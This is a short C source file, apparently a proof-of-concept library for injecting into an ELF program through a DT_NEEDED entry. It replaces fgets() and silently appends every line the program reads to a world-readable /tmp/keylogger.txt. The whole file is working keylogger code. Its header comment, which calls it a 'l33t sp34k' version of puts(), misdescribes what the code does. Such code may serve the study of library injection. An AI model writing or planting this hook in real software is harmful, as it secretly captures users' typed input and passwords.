/*
 * l33t sp34k version of puts() for DT_NEEDED .so injection
 * elfmaster 2/15/2019
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdbool.h>

#define OUTPUT_FILE "/tmp/keylogger.txt"

char *fgets(char *buf, int size, FILE *fp)
{
	char * (*o_fgets)(char *s, int, FILE *);
	o_fgets = (char * (*)(char *, int, FILE *))dlsym(RTLD_NEXT, "fgets");
	char *p = buf;
	char output[8];
	int fd2;

	char *outbuf = o_fgets(buf, size, fp);
	fd2 = open(OUTPUT_FILE, O_CREAT|O_WRONLY, 0777);
	if (fd2 < 0) {
		perror("open");
		exit(-1);
	}
	lseek(fd2, 0, SEEK_END);
	write(fd2, buf, size);
	close(fd2);
	return outbuf;
}
